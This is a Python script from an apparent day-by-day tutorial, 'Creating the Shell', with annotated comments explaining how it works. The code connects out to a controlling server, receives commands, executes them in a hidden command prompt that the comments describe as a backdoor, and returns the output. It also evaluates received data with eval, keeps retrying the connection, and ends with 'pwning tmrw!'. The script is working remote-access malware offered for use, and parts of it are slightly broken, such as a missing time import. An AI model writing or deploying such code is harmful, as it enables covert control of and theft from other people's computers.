# Day 9 - Creating the Shell

import socket
import json
import subprocess # 2
import os # 2

def ip_address():
    global server_ip
    serv_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    serv_ip.connect(("8.8.8.8", 80))
    server_ip = serv_ip.getsockname()[0]
    serv_ip.close()
    return server_ip

#########################

server_ip = ip_address() 
server_port = 5555 

#########################

def json_send(data):
    jsondata = json.dumps(data)
    client.send(jsondata.encode())

def json_recv(size=1024):
    data = ''
    while True:
        try:
            data += client.recv(size).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def message_send(string, size=8):
    no_str = False
    if type(string) != str:
        string =str(string)
        no_str = True
    body = string.encode()
    length = len(body)
    header = str(length).encode()
    header += b' ' * (size - len(header))
    client.send(header)
    client.send(body)
    if no_str == True:
        client.send('T'.encode())
    else:
        client.send('F'.encode())

def message_recv(size=8):
    while True:
        header = client.recv(size).decode()
        if header:
            body_size = int(header)
            body = client.recv(body_size).decode()
            no_str = client.recv(1).decode()
            break
    if no_str == 'T':
        body = eval(body)
    return body


def shell():
    while True:
        command = json_recv() # 9
        if command == 'cd':
            pass
        elif command == 'ls':
            pass
        elif command == 'clear':
            pass
        elif command == 'quit':
            break
        else: # 10
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # 11
            result = execute.stdout.read() + execute.stderr.read() # 11
            result = result.decode() # 12
            json_send(result) # 13


def connection():   
    global client
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    while True:
        time.sleep(0)
        try:
            client.connect((server_ip, server_port))
            shell()
            client.close()
            break
        except:
            connection()

connection()



########################

# 9     We are going to decode the given cxommand using the new functions json_send/json_recv
# 10    if the client.py script does not receive any given commands from ['cd', 'ls',' 'clear', 'quit'],
#       it will assume that there are another commands that is going to execute in the command prompt (windows)
#       from the new module subprocess, we are going to open a command prompt from the client that is not visible by the client. (backdoor)
#       please see the documentations of subprocess from this link https://docs.python.org/3/library/subprocess.html
#       and whatever the result is going to assigned to the 'execute' variable
# 11    now, in order to send it back to the server, we have to read the output from the invisible command prompt, and assign it to result.
# 12    since it is encoded, we have to decode it first.
# 13    and then we are going to send the output using json_send to back to the server.

########################


# pwning tmrw!